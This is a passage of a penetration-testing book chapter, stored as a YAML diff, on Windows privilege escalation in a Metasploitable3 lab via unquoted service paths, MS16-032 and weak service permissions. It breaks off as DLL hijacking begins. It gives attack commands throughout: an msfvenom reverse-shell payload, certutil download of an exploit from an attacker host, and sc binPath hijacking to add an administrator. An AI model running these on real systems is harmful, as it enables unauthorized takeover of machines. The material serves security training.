@@ -1,0 +1,1420 @@
+- en: '*Chapter 8*: Exploiting Services'
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: Now that you have a good grasp of the common privilege escalation attack vectors
+    on Windows, we can take a deeper look at Windows services and begin exploring
+    the privilege escalation techniques that leverage vulnerabilities and misconfigurations
+    in services in order to elevate our privileges on the target system. The objective
+    of this chapter is to identify and exploit vulnerabilities and misconfigurations
+    in common Windows services.
+  prefs: []
+  type: TYPE_NORMAL
+- en: We will explore the process of identifying and exploiting unquoted service paths
+    and weak service permissions, and we will then take a look at how to exploit the
+    Windows secondary logon in order to elevate our privileges. We will also take
+    an in-depth look at the process of identifying and hijacking missing **Dynamic
+    Link Libraries** (**DLLs**).
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In this chapter, we''re going to cover the following main topics:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Exploiting services and misconfigurations
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Exploiting unquoted service paths
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Exploiting secondary logon
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Exploiting weak service permissions
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: DLL hijacking
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Technical requirements
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: To follow along with the demonstrations in this chapter, you will need to ensure
+    that you are familiar with Windows CMD commands.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'You can view this chapter''s code in action here: [https://bit.ly/3utJTyI](https://bit.ly/3utJTyI)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Exploiting services and misconfigurations
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: Windows utilizes various services to manage and maintain standard system functionality,
+    such as starting services, configuring start up programs, authentication, and
+    software installation, to name a few. Our objective is to find vulnerabilities
+    and misconfigurations in these services in order to elevate our privileges.
+  prefs: []
+  type: TYPE_NORMAL
+- en: This process is dynamic and, as a result, will depend on the target configuration
+    and deployment use case, primarily because the techniques involved in this process
+    will depend on the implementation and configuration of particular services.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Given the robust nature of this process and the techniques used, we will be
+    utilizing the Metasploitable3 virtual machine that we set up in [*Chapter 2*](B17389_02_Final_PG_ePub.xhtml#_idTextAnchor030),
+    *Setting Up Our Lab*, of this book.
+  prefs: []
+  type: TYPE_NORMAL
+- en: This is because the Metasploitable3 virtual machine runs on Windows Server 2008
+    and has been configured to be run as a server, as well as hosting various services
+    and applications.
+  prefs: []
+  type: TYPE_NORMAL
+- en: This robust configuration of applications provides a great real-world scenario
+    for a practical demonstration of the tools and techniques that we will be using
+    in this chapter.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Before we begin, ensure that you have a foothold on the target system and have
+    access through a command shell or Meterpreter session.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The techniques and tools used in this chapter will involve utilizing native
+    Windows commands and specific Meterpreter modules to automate various aspects
+    of the process.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Exploiting unquoted service paths
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: 'When starting or running services, Windows requires the location of the target
+    executable in order to run. The path of the executable is typically encapsulated
+    by quotation marks, which allows Windows to locate the path or location of the
+    executable. The following path is an example of a secure service path:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '"C:\Program Files\OpenSSH\bin\cygrunsrv.exe"'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'If the path of the executable is not encapsulated by quotation marks, Windows
+    will resort to searching for the executable in every directory and executing each
+    one until it locates the target executable. We can leverage this vulnerability
+    to elevate our privileges by identifying a service that runs under administrative
+    privileges and that is not encapsulated in quotation marks. The following path
+    is an example of an insecure service path that we can exploit:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: C:\Program Files\OpenSSH\bin\cygrunsrv.exe
+  prefs: []
+  type: TYPE_NORMAL
+- en: The exploitation process involves generating and uploading a binary to the target
+    system, which will provide us with an elevated reverse shell or Meterpreter session
+    when executed.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'This technique can be recreated by following this procedure:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The first step in this process involves identifying a service path that is
+    not encapsulated by quotation marks, which can be done by utilizing the **Windows
+    Management Instrumentation** (**WMIC**) interface in conjunction with the **findstr**
+    utility. This can be done by running the following command in the Windows command
+    shell on the target system:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**wmic service get name,displayname,pathname,startmode |findstr /i /v "c:\"
+    |findstr /i /v """**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'This command will output a list of services with unquoted service paths; in
+    our case, we were able to identify a plethora of services with unquoted paths
+    that we can exploit. As highlighted in the following screenshot, we can use the
+    OpenSSH service path:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.1 – Finding unquoted service paths'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_001.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.1 – Finding unquoted service paths
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: The reason we are utilizing the OpenSSH service is that the service requires
+    administrative privileges to run and, as a result, is executed under the administrative
+    user.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The next step involves checking the directory permissions in order to determine
+    whether we can write or make changes to the OpenSSH service directory. We can
+    check the permissions of the directory by utilizing the **Integrity Control Access
+    Control Lists** (**icacls**) utility by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**icacls "C:\Program Files\OpenSSH"**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, this will output the directory
+    permissions; in this case, standard users on the system have write permissions,
+    therefore giving us the ability to make changes to the contents of the directory
+    as we are part of the **BUILTIN\Users** group:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.2 – Service path permissions'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_002.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.2 – Service path permissions
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: We can leverage this misconfiguration to elevate our privileges by replacing
+    the OpenSSH executable with a reverse shell binary. Once the OpenSSH service has
+    been started or restarted, the reverse shell binary will be executed instead of
+    the OpenSSH executable.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Tip
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: The reverse shell payload should have the same name as the service we are trying
+    to exploit and should be uploaded to the respective service path we identified
+    earlier.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can generate the Meterpreter payload with **msfvenom** and save it as an
+    executable. This can be done by running the following command in Kali:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LISTENER-IP> LPORT=<PORT>
+    -f exe > /home/kali/Desktop/cygrunsrv.exe**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After generating the payload, we can upload it to the OpenSSH service path,
+    as follows:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: C:\Program Files\OpenSSH\bin
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'Before we can upload the Meterpreter payload, we need to change the name of
+    the original binary. However, it is recommended to take a backup of the original
+    binary in the event that the process does not work as expected. The original executable
+    can be deleted by running the following command in the Meterpreter session:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**rm cygrunsrv.exe**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can now upload the Meterpreter executable to the OpenSSH service path on
+    the target using Meterpreter by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**upload /home/kali/Desktop/cygrunsrv.exe**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: In the event you are using a standard command shell, you can use the **certutil**
+    utility to transfer the binary to the target system.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: As illustrated in the following screenshot, this will upload the Meterpreter
+    executable to the OpenSSH service path:![Figure 8.3 – Uploading the Meterpreter
+    payload
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_003.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.3 – Uploading the Meterpreter payload
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We now need to set up the Meterpreter listener with Metasploit. This can be
+    done by running the following command in the Metasploit console:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**use /exploit/multi/handler**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The next step involves specifying the payload we used to create the binary
+    with **msfvenom**. This can be done by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**set payload /windows/x64/meterpreter/reverse_tcp**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: We now need to configure the module options. In this case, we need to configure
+    the **LHOST** and **LPORT** options as highlighted in the following screenshot:![Figure
+    8.4 – Meterpreter payload options
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_004.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.4 – Meterpreter payload options
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After setting the module options, we can start the listener by running the
+    following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**run**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: The listener will listen for any incoming connections from the payload we generated
+    with **msfvenom**.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'In order to execute the Meterpreter executable, we need to restart the OpenSSH
+    service. This can be done by running the following commands in the Windows command
+    shell:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**sc stop OpenSSHd**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**sc start OpenSSHd**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: As illustrated in the following screenshot, this will restart the OpenSSH service
+    and in turn, we should receive a privileged Meterpreter session on our listener:![Figure
+    8.5 – Meterpreter session
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_005.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.5 – Meterpreter session
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can verify that we have an elevated Meterpreter session by running the following
+    command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**getuid**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As illustrated in the following screenshot, we have successfully elevated our
+    privileges and should have a Meterpreter session with administrative privileges:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.6 – Unquoted service path Meterpreter privileges'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_006.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.6 – Unquoted service path Meterpreter privileges
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can also automate the process by using a Metasploit module to identify and
+    exploit a target service with an unquoted service path and automatically upload
+    a reverse shell payload that will provide us with an elevated Meterpreter session.
+    This can be done by running the following command in the Metasploit console:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**use exploit/windows/local/unquoted_service_path**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After loading the module, we need to configure the module options. In this
+    case, we need to configure the **SESSION** ID and target payload as highlighted
+    in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.7 – Unquoted service path module options'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_007.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.7 – Unquoted service path module options
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After configuring the module options, we can launch the module by running the
+    following command in the Metasploit console:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**run**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, if the module runs successfully,
+    we should receive a Meterpreter session with elevated privileges:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.8 – Unquoted service path Meterpreter session'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_008.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.8 – Unquoted service path Meterpreter session
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can verify that we have an elevated Meterpreter session by running the following
+    command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**getuid**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, we have successfully elevated our
+    privileges and should have a Meterpreter session with administrative privileges:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.9 – Unquoted service path Meterpreter privileges'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_009.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 8.9 – Unquoted service path Meterpreter privileges
+  prefs: []
+  type: TYPE_NORMAL
+- en: We have now been able to successfully elevate our privileges through unquoted
+    service paths and can explore the process of exploiting the secondary logon handle.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Exploiting secondary logon
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: 'The secondary logon is a Windows service that is used by administrators to
+    perform administrative tasks through a standard system account. This service can
+    be exploited through an inherent vulnerability that affects the following versions
+    of Windows:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Windows 7
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Windows Server 2008
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Windows 8.1
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Windows Server 2012
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Windows 10
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: The exploitation process leverages the lack of sanitization of handles in the
+    secondary logon service, which can allow a user to duplicate a system service
+    thread handle.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In this section, we will take a look at how to exploit this vulnerability both
+    manually and automatically using the Metasploit framework. It is important to
+    note, however, that the exploit requires certain dependencies to be met in order
+    for this process to work:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: The target system should have two or more CPU cores.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: The target system should be running PowerShell V2.0 or later.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'More information regarding this exploit can be found here: [https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032).'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Before we begin, ensure that you have a foothold on the target system and have
+    access through a command shell or Meterpreter session.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Now that we have an understanding of how the exploitation process works, we
+    can take a look at how to exploit the vulnerability to elevate our privileges:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We have already taken an in-depth look at how to search for and identify exploits
+    in [*Chapter 4*](B17389_04_Final_PG_ePub.xhtml#_idTextAnchor058), *Performing
+    Local Enumeration*, and were able to deduce that the Metasploitable3 virtual machine
+    is vulnerable to this attack. We can begin the process by utilizing a Metasploit
+    module that automates the exploitation process. This can be done by loading the
+    following module in the Metasploit console:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**use exploit/windows/local/ms16_032_secondary_logon_handle_privesc**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After loading the module, we need to configure the module options. In this
+    case, we need to set the default payload, session ID, **LPORT**, and **LHOST**
+    options, as highlighted in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.10 – Secondary logon handle module options'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_010.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.10 – Secondary logon handle module options
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After configuring the module options, we can launch the module by running the
+    following command in the Metasploit console:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**run**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As illustrated in the following screenshot, if the module runs successfully,
+    we should receive a Meterpreter session with elevated privileges:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.11 – Secondary logon handle exploit successful](Images/B17389_08_011.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_IMG
+- en: Figure 8.11 – Secondary logon handle exploit successful
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can verify that we have an elevated Meterpreter session by running the following
+    command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**getuid**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As illustrated in the following screenshot, we have successfully elevated our
+    privileges and should have a Meterpreter session with administrative privileges:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.12 – Secondary logon handle Meterpreter privileges'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_012.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.12 – Secondary logon handle Meterpreter privileges
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'Alternatively, if you do not have access to the target through a Meterpreter
+    session, you can compile the exploit and transfer it to the target. The pre-built
+    exploit binaries for this vulnerability can be found here: [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032).'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, the GitHub repository contains
+    a PowerShell script and pre-built binaries for both x64- and x86-based systems:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.13 – MS16_032 GitHub repository'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_013.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 8.13 – MS16_032 GitHub repository
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'It is, however, recommended to analyze and compile the exploit code yourself.
+    The source code for the exploit can be found here: [https://github.com/khr0x40sh/ms16-032](https://github.com/khr0x40sh/ms16-032).'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'After downloading or compiling the binary, we need to transfer it to the target
+    system. This can be done by following the procedure outlined here:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To set up a web server on our Kali virtual machine, we can utilize the **SimpleHTTPServer**
+    Python module to serve the binary file. This can be done by running the following
+    command in the directory where the **ms16-032.exe** binary is stored:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**sudo python -m SimpleHTTPServer 80**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'Alternatively, you can also utilize the Python 3 **http.server** module by
+    running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**sudo python3 -m http.server 80**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can now use the **certutil** utility to download the binary from the Kali
+    virtual machine to our target system. This can be done by running the following
+    command on the target system:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**certutil -urlcache -f http://<KALI-VM-IP>/ms16-032.exe ms16-032.exe**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can now execute the **ms16-032.exe** binary. This can be done by running
+    the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**.\ms-16-032.exe**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'If the binary runs successfully, you should receive output similar to the output
+    highlighted in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.14 – MS16-032 manual exploitation'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_014.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 8.14 – MS16-032 manual exploitation
+  prefs: []
+  type: TYPE_NORMAL
+- en: We have been able to successfully elevate our privileges by exploiting the secondary
+    logon service both manually and automatically.
+  prefs: []
+  type: TYPE_NORMAL
+- en: We can now take a look at how to identify and exploit weak service permissions
+    to elevate our privileges.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Exploiting weak service permissions
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: This exploit involves leveraging improperly configured service permissions in
+    order to elevate our privileges. The objective of this process is to identify
+    services that run with **SYSTEM** or administrative privileges and use the improper
+    permission configurations for the service to execute arbitrary commands through
+    the **BINARY_PATH_NAME** parameter.
+  prefs: []
+  type: TYPE_NORMAL
+- en: We can exploit this vulnerability to add a standard user to the local administrators
+    group and consequently achieve an elevated state on the system.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The exploitation process can be performed by following these steps:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The first step in the process involves identifying services and applications
+    that standard users have access to. This can be facilitated through the use of
+    the **accesschk** utility that is found in the **Sysinternals** suite. The **accesschk**
+    executable can be downloaded from here: [https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk).'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'After downloading the **accesschk** executable to our Kali virtual machine,
+    we will need to transfer it to the target system. This can be done through Meterpreter
+    by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**upload /<PATH-TO-EXECUTABLE/accesschk64.exe**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: In the event that you are using a standard command shell, you can use the **certutil**
+    utility to transfer the binary to the target system.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After uploading the **accesschk.exe** binary to the target system, we can enumerate
+    a list of services that standard users have access to by running the following
+    command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**.\accesschk64.exe -uwcqv "vagrant" * -accepteula**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'In our case, we will use the standard **vagrant** user. As highlighted in the
+    following screenshot, the command should output a list of services that have **SERVICE_ALL_ACCESS**
+    permissions:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Note
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: The **SERVICE_ALL_ACCESS** permission allows any user on the system to take
+    control of and modify the parameters of the service.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.15 – accesschk results](Images/B17389_08_015.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_IMG
+- en: Figure 8.15 – accesschk results
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: We are able to identify a plethora of services with **SERVICE_ALL_ACCESS** permissions.
+    In our case, we will be targeting the OpenSSH service primarily because we were
+    able to identify that it runs with **SYSTEM** or administrative privileges.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The next step involves enumerating additional information regarding the service
+    and its respective parameters. This can be done by running the following command
+    in the Windows command shell:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**sc qc OpenSSHd**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, the command will output information
+    about the service and its parameters:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.16 – Service parameters'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_016.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.16 – Service parameters
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can modify **BINARY_PATH_NAME** to execute arbitrary commands. In our case,
+    we will be adding the **vagrant** user to the local administrators group. This
+    can be done by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**sc config "OpenSSHd" binPath= "net localgroup administrators vagrant /add"**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, if the operation runs successfully,
+    the **vagrant** user account will be added to the local administrators group and
+    should have administrative privileges:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.17 – Modifying the binary path'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_017.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.17 – Modifying the binary path
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After modifying the binary path parameter, we need to restart the OpenSSH service.
+    This can be done by running the following commands in the Windows command shell:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**sc stop OpenSSHd**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**sc start OpenSSHd**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can verify that the **vagrant** user account has been added to the local
+    administrators group by running the following command in the Windows command shell:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**net localgroup administrators**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, the **vagrant** user account is
+    now a member of the local administrators group and has administrative privileges:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.18 – Local administrator''s group members'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_018.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.18 – Local administrator's group members
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'This process can also be automated through the use of a Metasploit module named
+    **exploit/windows/local/service_permissions**. We can load the module by running
+    the following command in the Metasploit console:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**use exploit/windows/local/service_permissions**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After loading the module, we need to configure the module options. In this
+    case, we need to set the default payload, **LHOST**, **LPORT**, and the session
+    ID option, as highlighted in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.19 – Service permissions module options'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_019.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.19 – Service permissions module options
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After configuring the module options, we can launch the module by running the
+    following command in the Metasploit console:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**run**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, if the module runs successfully,
+    we should receive a Meterpreter session with elevated privileges:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.20 – Service permissions module Meterpreter session'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_020.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.20 – Service permissions module Meterpreter session
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can verify that we have an elevated Meterpreter session by running the following
+    command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**getuid**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As illustrated in the following screenshot, we have successfully elevated our
+    privileges and should have a Meterpreter session with administrative privileges:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.21 – Service permissions Meterpreter privileges'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_021.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 8.21 – Service permissions Meterpreter privileges
+  prefs: []
+  type: TYPE_NORMAL
+- en: We have been able to successfully elevate our privileges by exploiting weak
+    service permissions both manually and automatically.
+  prefs: []
+  type: TYPE_NORMAL
+- en: We can now take a look at the process of DLL hijacking and how it can be leveraged
